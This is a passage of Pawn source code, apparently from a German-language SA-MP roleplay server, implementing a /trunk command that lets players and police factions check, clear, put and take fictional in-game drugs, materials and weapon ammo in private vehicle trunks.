		   	if(strcmp(x_job,"check",true) == 0)
		   	{
				if(PlayerInfo[playerid][sMember] == 1 ||  PlayerInfo[playerid][sMember] == 2 ||PlayerInfo[playerid][sMember] == 3    ||PlayerInfo[playerid][sMember] == 22 )//San Andreas Präsident spawn
				{
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;

		  			if(IsPlayerInAnyVehicle(playerid))
		   			{
					SendClientMessage(playerid, COLOR_GRAD1, "Das kannst du nur zur Fuss!");
					return 1;
					}
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);


									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}


								new a4x_job[256];
								new a5x_job[256];
				                format(a5x_job, sizeof(a5x_job), "Kofferaum von Fahrzeug %d (%s)", PlayerCar[carowner][slot][CarId],CarName[PlayerCar[carowner][slot][CarModel]-400]);
				                format(a4x_job, sizeof(a4x_job), "Drogen: %d\nMaterialen: %d\nDeagle: %d\nShotgun: %d\nMP5: %d\nAK47: %d\nM4: %d\nRifle: %d\nSniper: %d", PlayerCar[carowner][slot][CarDrogen],PlayerCar[carowner][slot][CarMats],PlayerCar[carowner][slot][CarDeagle],
								PlayerCar[carowner][slot][CarShotgun],PlayerCar[carowner][slot][CarMP5],PlayerCar[carowner][slot][CarAk47],PlayerCar[carowner][slot][CarM4],PlayerCar[carowner][slot][CarRifle],PlayerCar[carowner][slot][CarSniper]);
								ShowPlayerDialog(playerid, 5216, DIALOG_STYLE_LIST, a5x_job, a4x_job, "Schliessen", "");
								GameTextForPlayer(playerid, "Fahrzeug Aufgebrochen!", 5000, 1);
                                format(string, sizeof(string), "* %s %s durchsucht ein (%s)",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]),GetName(playerid),CarName[PlayerCar[carowner][slot][CarModel]-400]);
                     			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);// Kofferaum muss aufgehen Automatisch und FBI und LVPD UND SWAT!! DU BIST KEIN COP
								new engine, lights, alarm, doors, bonnet, boot, objective;
								GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
								SetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, VEHICLE_PARAMS_ON, objective); // ONLY the engine param was changed to VEHICLE_PARAMS_ON (1)
							}
							else
							{
						    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst dieses Fahrzeug nicht durchsuchen!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
				}
				else
				{
//				SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
//				return 1;
				}
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);

									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}




								if(carowner == playerid)// Privatfahrzeug
						   		{
									new a4_job[256];
									new a5_job[256];
					                format(a5_job, sizeof(a5_job), "Kofferaum von Fahrzeug %d (%s)", PlayerCar[carowner][slot][CarId],CarName[PlayerCar[carowner][slot][CarModel]-400]);
					                format(a4_job, sizeof(a4_job), "Drogen: %d\nMaterialen: %d\nDeagle: %d\nShotgun: %d\nMP5: %d\nAK47: %d\nM4: %d\nRifle: %d\nSniper: %d", PlayerCar[carowner][slot][CarDrogen],PlayerCar[carowner][slot][CarMats],PlayerCar[carowner][slot][CarDeagle],
									PlayerCar[carowner][slot][CarShotgun],PlayerCar[carowner][slot][CarMP5],PlayerCar[carowner][slot][CarAk47],PlayerCar[carowner][slot][CarM4],PlayerCar[carowner][slot][CarRifle],PlayerCar[carowner][slot][CarSniper]);
									ShowPlayerDialog(playerid, 5216, DIALOG_STYLE_LIST, a5_job, a4_job, "Schliessen", "");
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben den Kofferaum Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
			   	return 1;
			}
		   	if(strcmp(x_job,"clear",true) == 0)
		   	{
				if(PlayerInfo[playerid][sMember] == 1 ||  PlayerInfo[playerid][sMember] == 2 ||PlayerInfo[playerid][sMember] == 3    ||PlayerInfo[playerid][sMember] == 22 )//San Andreas Präsident spawn
				{
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;

		  			if(IsPlayerInAnyVehicle(playerid))
		   			{
					SendClientMessage(playerid, COLOR_GRAD1, "Das kannst du nur zur Fuss!");
					return 1;
					}
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);
								if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							    {
								SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								return 1;
								}
								PlayerCar[carowner][slot][CarDrogen] = 0;
								PlayerCar[carowner][slot][CarMats] = 0;
								PlayerCar[carowner][slot][CarDeagle] = 0;
								PlayerCar[carowner][slot][CarShotgun] = 0;
								PlayerCar[carowner][slot][CarMP5] = 0;
								PlayerCar[carowner][slot][CarAk47] = 0;
								PlayerCar[carowner][slot][CarM4] = 0;
								PlayerCar[carowner][slot][CarRifle] = 0;
								PlayerCar[carowner][slot][CarSniper] = 0;
						    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast den inhalt des Kofferaums entzogen!");
								new strindg[128];
               					format(strindg, sizeof(strindg), "* %s %s hat den deinen Kofferauminhalt entzogen!", GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]),GetName(playerid));
								SendClientMessage(carowner, COLOR_DBLUE, strindg);
							}
							else
							{
						    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst dieses Fahrzeug nicht durchsuchen!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Du bist kein Cop!");
				}
			   	return 1;
			}
		   	if(strcmp(x_job,"put",true) == 0)
		   	{
	        	x_job = strtoknew(cmdtext, idx);
				if(!strlen(x_job))
				{
					SendClientMessage(playerid, COLOR_WHITE, "[Benutzung]: /trunk [open/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
					return 1;
				}
		   		if(strcmp(x_job,"mats",true) == 0)
		   		{
		        	x_job = strtoknew(cmdtext, idx);
					if(!strlen(x_job))
					{
						SendClientMessage(playerid, COLOR_WHITE, "[Benutzung]: /trunk [open/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
						return 1;
					}
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);
								if(carowner == playerid)// Privatfahrzeug
						   		{


									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}





							   		if(PlayerInfo[playerid][pMats] >= strval(x_job))
							   		{
										new engine, lights, alarm, doors, bonnet, boot, objective;
										GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
									   	if(boot == -1)
									   	{
											SendClientMessage(playerid, COLOR_GREY, "Der Kofferaum ist nicht geöffnet! /trunk open");
											return 1;
										}
										PlayerCar[carowner][slot][CarMats] += strval(x_job);
							    		PlayerInfo[playerid][pMats] -= strval(x_job);
										new kackiyy[256];
				                		format(kackiyy, sizeof(kackiyy), "* Du hast %d Mats in deinen %s gelegt!", strval(x_job),CarName[PlayerCar[carowner][slot][CarModel]-400]);
										SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyy);
									}
									else
							   		{
										SendClientMessage(playerid, COLOR_GREY, "Du hast nicht genug Mats!");
									}
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben den Kofferaum Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
					return 1;
				}
		   		if(strcmp(x_job,"drugs",true) == 0)
		   		{
		        	x_job = strtoknew(cmdtext, idx);
					if(!strlen(x_job))
					{
						SendClientMessage(playerid, COLOR_WHITE, "[Benutzung]: /trunk [open/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
						return 1;
					}
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);





								if(carowner == playerid)// Privatfahrzeug
						   		{

									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}




							   		if(PlayerInfo[playerid][pDrugs] >= strval(x_job))
							   		{
										new engine, lights, alarm, doors, bonnet, boot, objective;
										GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
									   	if(boot == -1)
									   	{
											SendClientMessage(playerid, COLOR_GREY, "Der Kofferaum ist nicht geöffnet! /trunk open");
											return 1;
										}
										PlayerCar[carowner][slot][CarDrogen] += strval(x_job);
						    			PlayerInfo[playerid][pDrugs] -= strval(x_job);
										new kackiyyd[256];
				                		format(kackiyyd, sizeof(kackiyyd), "* Du hast %d Drogen in deinen %s gelegt!", strval(x_job),CarName[PlayerCar[carowner][slot][CarModel]-400]);
										SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyyd);
									}
									else
							   		{
										SendClientMessage(playerid, COLOR_GREY, "Du hast nicht genug Drogen!");
									}
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben den Kofferaum Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
					return 1;
				}
		   		if(strcmp(x_job,"deagle",true) == 0)
		   		{
					if(GetPlayerWeapon(playerid) == 24)
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarDeagle] += GetPlayerAmmo(playerid);
							ResetPlayerWeapons(playerid);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Deagle mit %d Munition in deinen %s gelegt!", GetPlayerAmmo(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "Du hast keine Deagle in der Hand!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"shotgun",true) == 0)
		   		{
					if(GetPlayerWeapon(playerid) == 25)
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarShotgun] += GetPlayerAmmo(playerid);
							ResetPlayerWeapons(playerid);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Shotgun mit %d Munition in deinen %s gelegt!", GetPlayerAmmo(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "Du hast keine Shotgun in der Hand!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"mp5",true) == 0)
		   		{
					if(GetPlayerWeapon(playerid) == 29)
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarMP5] += GetPlayerAmmo(playerid);
							ResetPlayerWeapons(playerid);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine MP5 mit %d Munition in deinen %s gelegt!", GetPlayerAmmo(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "Du hast keine MP5 in der Hand!");
					return 1;
					}

					return 1;
				}
		   		if(strcmp(x_job,"ak47",true) == 0)
		   		{
					if(GetPlayerWeapon(playerid) == 30)
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarAk47] += GetPlayerAmmo(playerid);
							ResetPlayerWeapons(playerid);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine AK47 mit %d Munition in deinen %s gelegt!", GetPlayerAmmo(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "Du hast keine AK47 in der Hand!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"m4",true) == 0)
		   		{
					if(GetPlayerWeapon(playerid) == 31)
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarM4] += GetPlayerAmmo(playerid);
							ResetPlayerWeapons(playerid);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine M4 mit %d Munition in deinen %s gelegt!", GetPlayerAmmo(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "Du hast keine M4 in der Hand!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"rifle",true) == 0)
		   		{
					if(GetPlayerWeapon(playerid) == 33)
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRifle] += GetPlayerAmmo(playerid);
							ResetPlayerWeapons(playerid);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Rifle mit %d Munition in deinen %s gelegt!", GetPlayerAmmo(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "Du hast keine Rifle in der Hand!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"sniper",true) == 0)
		   		{
					if(GetPlayerWeapon(playerid) == 34)
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarSniper] += GetPlayerAmmo(playerid);
							ResetPlayerWeapons(playerid);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Sniper mit %d Munition in deinen %s gelegt!", GetPlayerAmmo(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "Du hast keine Sniper in der Hand!");
					return 1;
					}
					return 1;
				}
			   	return 1;
			}
		   	if(strcmp(x_job,"take",true) == 0)
		   	{
	        	x_job = strtoknew(cmdtext, idx);
				if(!strlen(x_job))
				{
					SendClientMessage(playerid, COLOR_WHITE, "[Benutzung]: /trunk [open/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
					return 1;
				}
		   		if(strcmp(x_job,"mats",true) == 0)
		   		{
		        	x_job = strtoknew(cmdtext, idx);
					if(!strlen(x_job))
					{
						SendClientMessage(playerid, COLOR_WHITE, "[Benutzung]: /trunk [open/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
						return 1;
					}

		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);
								if(carowner == playerid)// Privatfahrzeug
						   		{

									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}




							   		if(strval(x_job) <= PlayerCar[carowner][slot][CarMats])
							   		{
										new engine, lights, alarm, doors, bonnet, boot, objective;
										GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
									   	if(boot == -1)
									   	{
											SendClientMessage(playerid, COLOR_GREY, "Der Kofferaum ist nicht geöffnet! /trunk open");
											return 1;
										}
										PlayerCar[carowner][slot][CarMats] -= strval(x_job);
							    		PlayerInfo[playerid][pMats] += strval(x_job);
										new kackiyy[256];
				                		format(kackiyy, sizeof(kackiyy), "* Du hast %d Mats in deinen %s genommen!", strval(x_job),CarName[PlayerCar[carowner][slot][CarModel]-400]);
										SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyy);
									}
									else
							   		{
										new kackiyyf[256];
				                		format(kackiyyf, sizeof(kackiyyf), "Du hast nicht genug Mats in deinen %s!", CarName[PlayerCar[carowner][slot][CarModel]-400]);
										SendClientMessage(playerid, COLOR_GREY, kackiyyf);
									}

								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben den Kofferaum Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}


					return 1;
				}
		   		if(strcmp(x_job,"deagle",true) == 0)
		   		{
		        	x_job = strtoknew(cmdtext, idx);
					if(!strlen(x_job))
					{
						SendClientMessage(playerid, COLOR_WHITE, "[Benutzung]: /trunk [open/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
						return 1;
					}

					if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarDeagle] > strval(x_job))
					{
	         			    ServerWeapon(playerid, 24, strval(x_job));
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarDeagle] -= strval(x_job);
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Deagle mit %d Munition aus deinen %s genommen!", strval(x_job),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "So viel Deagle Munition hast du nicht in deinen Fahrzeug!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"shotgun",true) == 0)
		   		{
					if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarShotgun] > strval(x_job))
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarShotgun] -= strval(x_job);
	         			    ServerWeapon(playerid, 25, strval(x_job));
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Shotgun mit %d Munition aus deinen %s genommen!", strval(x_job),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "So viel Shotgun Munition hast du nicht in deinen Fahrzeug!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"mp5",true) == 0)
		   		{
					if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarMP5] > strval(x_job))
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarMP5] -= strval(x_job);
	         			    ServerWeapon(playerid, 29, strval(x_job));
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine MP5 mit %d Munition aus deinen %s genommen!", strval(x_job),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "So viel MP5 Munition hast du nicht in deinen Fahrzeug!");
					return 1;
					}

					return 1;
				}
		   		if(strcmp(x_job,"ak47",true) == 0)
		   		{
					if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarAk47] > strval(x_job))
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarAk47] -= strval(x_job);
	         			    ServerWeapon(playerid, 30, strval(x_job));
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine AK47 mit %d Munition aus deinen %s genommen!", strval(x_job),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "So viel AK47 Munition hast du nicht in deinen Fahrzeug!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"m4",true) == 0)
		   		{
					if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarM4] > strval(x_job))
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarM4] -= strval(x_job);
	         			    ServerWeapon(playerid, 31, strval(x_job));
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine M4 mit %d Munition aus deinen %s genommen!", strval(x_job),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "So viel M4 Munition hast du nicht in deinen Fahrzeug!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"rifle",true) == 0)
		   		{
					if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRifle] > strval(x_job))
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRifle] -= strval(x_job);
	         			    ServerWeapon(playerid, 33, strval(x_job));
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Rifle mit %d Munition aus deinen %s genommen!", strval(x_job),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "So viel Rifle Munition hast du nicht in deinen Fahrzeug!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"sniper",true) == 0)
		   		{
					if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarSniper] > strval(x_job))
					{
							PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarSniper] -= strval(x_job);
	         			    ServerWeapon(playerid, 34, strval(x_job));
							new kackiyydf[256];
	                		format(kackiyydf, sizeof(kackiyydf), "* Du hast deine Sniper mit %d Munition aus deinen %s genommen!", strval(x_job),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyydf);
					}
					else
					{
					SendClientMessage(playerid, COLOR_GREY, "So viel Sniper Munition hast du nicht in deinen Fahrzeug!");
					return 1;
					}
					return 1;
				}
		   		if(strcmp(x_job,"drugs",true) == 0)
		   		{
		        	x_job = strtoknew(cmdtext, idx);
					if(!strlen(x_job))
					{
						SendClientMessage(playerid, COLOR_WHITE, "[Benutzung]: /trunk [open/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
						return 1;
					}
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);
								if(carowner == playerid)// Privatfahrzeug
						   		{

									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}




							   		if(strval(x_job) <= PlayerCar[carowner][slot][CarDrogen])
							   		{
											new engine, lights, alarm, doors, bonnet, boot, objective;
											GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
										   	if(boot == -1)
										   	{
												SendClientMessage(playerid, COLOR_GREY, "Der Kofferaum ist nicht geöffnet! /trunk open");
												return 1;
											}
										PlayerCar[carowner][slot][CarDrogen] -= strval(x_job);
						    			PlayerInfo[playerid][pDrugs] += strval(x_job);
										new kackiyyd[256];
